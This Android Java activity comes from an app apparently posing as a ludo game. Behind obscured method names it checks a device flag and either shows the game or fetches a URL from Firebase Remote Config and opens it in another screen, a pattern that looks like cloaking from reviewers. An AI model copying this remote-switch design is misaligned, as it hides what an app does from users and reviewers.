package com.ludo.kin.actEMS;

import static com.ludo.kin.AppEMS.viewModEMS;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.ludo.kin.R;
import com.ludo.kin.modEMS.KKKK;

import org.apache.commons.codec.binary.Base32;

import java.util.Map;

public class EMSActivity extends AppCompatActivity {
    KKKK kk;
    FirebaseRemoteConfig mFirebaseRemoteConfig;
    public String statusEMS;
    public String urlEMS;
    boolean fff = true;
    boolean ggg = true;
    ImageView u1, u2,u3;

    @Override

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_emsactivity);
        kk = viewModEMS.kk(this);
        viewModEMS.bbbd(this);
        u1 = findViewById(R.id.u1);
        u2 = findViewById(R.id.u2);
        u3 = findViewById(R.id.u3);
        viewModEMS.pppp(u1,u2,u3);
        if (kk.isInterEms()) {
            ll();
        } else {
            iii();
        }


    }

    public void ll() {
        if (kk.getDevEms() == 1) {
            if (viewModEMS.mkk().equals("bbb")) {
                ccc(this);
            } else {
                stst(viewModEMS.mkk());
            }
        } else {
            sss();
        }
    }

    public void sss() {
        if (ggg){
        startActivity(new Intent(getApplicationContext(), BBActivity.class));
        finishAffinity();
        ggg = false;
        }
    }

    public void iii() {
        TextView textView = findViewById(R.id.textIntE);
        textView.setVisibility(View.VISIBLE);
        textView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(getApplicationContext(), EMSActivity.class));
                finishAffinity();
            }
        });
    }

    public void ccc(EMSActivity emsActivity) {
        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600)
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
        new Thread(new Runnable() {
            @Override
            public void run() {
                mFirebaseRemoteConfig.fetchAndActivate()
                        .addOnCompleteListener(emsActivity, new OnCompleteListener<Boolean>() {
                            @Override
                            public void onComplete(@NonNull Task<Boolean> task) {
                                if (task.isSuccessful()) {
                                    boolean updated = task.getResult();
                                    Log.d("weq", "Config params updated: " + updated);
                                    statusEMS = mFirebaseRemoteConfig.getString("ststst");
                                    urlEMS = mFirebaseRemoteConfig.getString("urururu");
                                    Log.d("weq", statusEMS);

                                    runOnUiThread(new Runnable() {
                                        @Override
                                        public void run() {
                                            viewModEMS.aa(emsActivity);
                                        }
                                    });

                                } else {

                                }
                            }
                        });
            }
        }).start();

    }


    public static String decodeEMS(String csagre) {
        Base32 base32EMS = new Base32();
        byte[] decodedBytesEMS = base32EMS.decode(csagre);
        return new String(decodedBytesEMS);
    }

    public void stst(String ss) {
        Log.d("weq", "www");
        viewModEMS.njjn(ss);
        if (fff) {
            Intent intent = new Intent(getApplicationContext(), InnnActivity.class);
            intent.putExtra("lll", ss);
            startActivity(intent);
            finishAffinity();
            fff = false;
        } else {
        }
    }
}